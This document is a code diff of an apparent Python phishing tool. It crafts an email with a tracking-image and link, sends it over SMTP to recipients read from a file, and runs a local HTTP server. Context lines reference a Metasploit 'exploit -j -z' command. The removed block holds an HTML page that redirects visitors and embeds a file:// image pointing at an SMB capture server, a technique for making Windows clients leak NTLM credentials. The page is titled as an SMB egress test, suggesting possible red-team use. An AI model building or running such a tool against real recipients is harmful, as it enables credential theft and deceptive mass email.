@@ -194,6 +194,10 @@ exploit -j -z')
         
         email_message = message.format(self.sender_name, self.sender_address, \
             self.recipient_name, self.rcpt_header, image_server_addr, link_tag)
+
+        print('Email message: \n {}'.format(email_message))
+
+        return email_message
                 
 
     def write_file(self, content, filename):
@@ -208,7 +212,8 @@ exploit -j -z')
     def read_file(self, filename):
         try:
             with open(filename, 'r') as file:
-                content = file.readlines()
+                content = file.read()
+                content = content.split()
                 return content
         except Exception as e:
             print(e)
@@ -286,10 +291,10 @@ exploit -j -z')
 
     def smtp_connection(self):
 
-        recipients = ','.join(self.read_file(self.recipients_file)).strip('\n')
-        print (recipients)
+        recipients = self.read_file(self.recipients_file)
+        msg_body = self.craft_message_body()
 
-        '''
+        
         smtpserver = smtplib.SMTP(self.smtp_server, self.smtp_port)
         smtpserver.ehlo()
         smtpserver.starttls()
@@ -304,7 +309,8 @@ exploit -j -z')
 
 
             if send_prompt is True:
-                smtpserver.sendmail(self.sender_address, self.recipient_addresses, self.email_message)
+                #from addr, to addr, msg
+                smtpserver.sendmail(self.sender_address, recipients, msg_body)
                 print("Message(s) sent!")
                 smtpserver.quit()
                 return True
@@ -317,10 +323,6 @@ exploit -j -z')
             status = -1
             print("[Aborting]SMTP Server Status: ",status)
         return True if status == 250 else False
-        '''
-
-
-
 
 
 def main():
@@ -427,11 +429,9 @@ def main():
     c1.get_external_ip()
     c1.prompts()
     c1.validate()
-    c1.smb_server()
+    #c1.smb_server()
     c1.craft_http_content()
     c1.smtp_connection()
-
-
 
 
     #this goes last since it runs forever -- need to fix
@@ -439,64 +439,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
-'''goes in main
-
-
-        ### EDIT: HTML Template Below ###
-        ### Becareful not to remove the variables {0} and {1} ###
-            html = """
-            <!DOCTYPE HTML>
-            <html lang="en-US">
-                <head>
-                    <meta charset="UTF-8">
-                    <meta http-equiv="refresh" content="1;url={1}">
-                    <script type="text/javascript">
-                        window.location.href = "{1}"
-                    </script>
-            <title>SMB Egress Test Page.</title>
-            </head>
-            <br>
-            <img src=file://{0}/image/foo.gif>
-            </body>
-            </html>
-            """
-            indexHTML = html.format(smbCaptureServer, redirect)
-            print(indexHTML)
-            print("\n")
-            with open('index.html','w+') as f1:
-                f1.write(indexHTML)
-            print('Starting HTTP Server')
-            print('\n...')
-            httpPort = 80
-            Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
-            httpd = SocketServer.TCPServer(("",httpPort), Handler)
-            server_process = multiprocessing.Process(target=httpd.serve_forever)
-            server_process.daemon = True
-            server_process.start()
-            print("Python SimpleHTTPServer now Listening on Port: " + str(httpPort))
-            print("\n")
-        elif choice in no:
-            print('Ok local HTTP Server not started: \n')
-        else:
-            sys.stdout.write("Please respond with 'yes' or 'no'")
-            
-    
-    elif choice in no:
-        print('Okay, A Hyplink will not be added to your message: \n')
-        link_tag = ''
-
-
-    
-
-    print('Email Message Template Below:')
-    time.sleep(1)
-    print(email_message)
-    smtp_connection
-(smtp_server_address, smtp_server_port, smtp_user, smtp_password, sender_address, recipient_address, email_message)
-    time.sleep(1)
-    smbServ()
-    '''
-
-
-
